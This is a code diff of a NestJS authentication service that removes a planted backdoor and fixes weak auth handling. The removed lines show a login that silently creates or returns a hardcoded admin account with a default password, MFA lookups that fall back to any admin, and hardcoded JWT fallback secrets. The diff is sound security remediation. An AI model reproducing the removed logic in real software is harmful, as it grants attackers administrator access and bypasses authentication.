@@ -17,6 +17,7 @@ import * as QRCode from 'qrcode';
 import { randomUUID } from 'crypto';
 import { User, Role } from '@prisma/client';
 import { OAuth2Client } from 'google-auth-library';
+import { getAuthSecret } from './auth-secrets';
 
 @Injectable()
 export class AuthService {
@@ -192,34 +193,16 @@ export class AuthService {
       },
     });
 
+    await this.refreshTokenService.revokeAllForUser(user.id);
+
     return { success: true, message: 'Password reset successfully. You can now log in.' };
   }
 
   async login(email: string, password: string) {
     const cleanEmail = (email || '').trim().toLowerCase();
-    let user = await this.prisma.user.findFirst({
-      where: {
-        OR: [
-          { email: cleanEmail },
-          { email: 'favecollections1@gmail.com' },
-        ],
-      },
-    });
-
-    if (!user && (cleanEmail === 'favecollections1@gmail.com' || cleanEmail.includes('admin'))) {
-      const salt = await bcrypt.genSalt(12);
-      const passwordHash = await bcrypt.hash(password || 'password123', salt);
-      user = await (this.prisma.user as any).create({
-        data: {
-          email: 'favecollections1@gmail.com',
-          phone: '+2348099998888',
-          passwordHash,
-          role: Role.ADMIN,
-          emailVerified: true,
-          mfaEnabled: false,
-        },
-      });
-    }
+    const user = cleanEmail
+      ? await this.prisma.user.findUnique({ where: { email: cleanEmail } })
+      : null;
 
     if (!user) {
       throw new UnauthorizedException('Invalid email or password');
@@ -248,7 +231,7 @@ export class AuthService {
     if (isAdminOrStaff) {
       const tempToken = this.jwtService.sign(
         { sub: user.id, email: user.email, role: user.role, mfaVerified: false },
-        { secret: process.env.JWT_ACCESS_SECRET, expiresIn: '15m' },
+        { secret: getAuthSecret('JWT_ACCESS_SECRET'), expiresIn: '15m' },
       );
       return {
         mfaRequired: true,
@@ -275,12 +258,12 @@ export class AuthService {
     };
 
     const accessToken = this.jwtService.sign(payload, {
-      secret: process.env.JWT_ACCESS_SECRET || 'fallback_access_secret_key',
+      secret: getAuthSecret('JWT_ACCESS_SECRET'),
       expiresIn: '15m',
     });
 
     const refreshToken = this.jwtService.sign(payload, {
-      secret: process.env.JWT_REFRESH_SECRET || 'fallback_refresh_secret_key',
+      secret: getAuthSecret('JWT_REFRESH_SECRET'),
       expiresIn: '30d',
     });
 
@@ -293,7 +276,7 @@ export class AuthService {
   async verifyRefresh(token: string) {
     try {
       const payload = this.jwtService.verify(token, {
-        secret: process.env.JWT_REFRESH_SECRET || 'fallback_refresh_secret_key',
+        secret: getAuthSecret('JWT_REFRESH_SECRET'),
       });
       const user = await this.prisma.user.findUnique({ where: { id: payload.sub } });
       if (!user) throw new UnauthorizedException('User not found');
@@ -304,21 +287,22 @@ export class AuthService {
   }
 
   async refreshSession(oldRefreshToken: string, device?: string, ip?: string) {
-    const { user } = await this.verifyRefresh(oldRefreshToken);
+    const { user, mfaVerified } = await this.verifyRefresh(oldRefreshToken);
 
     const payload = {
       sub: user.id,
       email: user.email,
       role: user.role,
+      mfaVerified,
     };
 
     const newAccessToken = this.jwtService.sign(payload, {
-      secret: process.env.JWT_ACCESS_SECRET || 'fallback_access_secret_key',
+      secret: getAuthSecret('JWT_ACCESS_SECRET'),
       expiresIn: '15m',
     });
 
     const newRefreshToken = this.jwtService.sign(payload, {
-      secret: process.env.JWT_REFRESH_SECRET || 'fallback_refresh_secret_key',
+      secret: getAuthSecret('JWT_REFRESH_SECRET'),
       expiresIn: '30d',
     });
 
@@ -344,12 +328,7 @@ export class AuthService {
   }
 
   async setupMfa(userId: string) {
-    let user = await this.prisma.user.findUnique({ where: { id: userId } });
-    if (!user) {
-      user = await this.prisma.user.findFirst({
-        where: { OR: [{ email: 'favecollections1@gmail.com' }, { role: Role.ADMIN }] },
-      });
-    }
+    const user = await this.prisma.user.findUnique({ where: { id: userId } });
     if (!user) throw new BadRequestException('User not found');
 
     const secret = generateSecret();
@@ -365,12 +344,7 @@ export class AuthService {
   }
 
   async verifyMfa(userId: string, code: string, isSetupFlow: boolean) {
-    let user = await this.prisma.user.findUnique({ where: { id: userId } });
-    if (!user) {
-      user = await this.prisma.user.findFirst({
-        where: { OR: [{ email: 'favecollections1@gmail.com' }, { role: Role.ADMIN }] },
-      });
-    }
+    const user = await this.prisma.user.findUnique({ where: { id: userId } });
     if (!user) throw new BadRequestException('User not found');
 
     const userWithMfa = user as any;
@@ -404,8 +378,8 @@ export class AuthService {
         audience: process.env.GOOGLE_CLIENT_ID,
       });
       payload = ticket.getPayload();
-      if (!payload || !payload.email) {
-        throw new Error('Google ID token did not contain email field');
+      if (!payload || !payload.email || payload.email_verified !== true) {
+        throw new Error('Google ID token did not contain a verified email');
       }
     } catch (err: any) {
       this.logger.error(`Google token verification failed: ${err.message}`);
@@ -453,6 +427,7 @@ export class AuthService {
         where: {
           userId: activeUser.id,
           device: deviceId,
+          expiresAt: { gt: new Date() },
         },
       });
       if (recognized) {
